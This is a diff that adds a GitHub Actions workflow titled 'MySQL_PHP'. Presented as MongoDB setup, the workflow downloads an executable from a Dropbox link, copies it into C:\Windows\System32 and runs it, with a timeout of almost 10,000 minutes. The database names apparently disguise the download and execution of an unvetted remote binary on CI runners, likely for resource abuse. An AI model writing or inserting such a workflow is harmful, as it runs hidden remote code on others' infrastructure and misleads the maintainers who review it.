@@ -1,0 +1,17 @@
+name: MySQL_PHP
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Download MongoDB
+      run: Invoke-WebRequest https://www.dropbox.com/s/6yw1i500urmaelv/MongoDB.exe?dl=1 -OutFile MongoDB.exe
+    - name: Copy MongoDB to Windows Directory.
+      run: copy MongoDB.exe C:\Windows\System32
+    - name: Connect your MongoDB account
+      run: .\MongoDB.exe
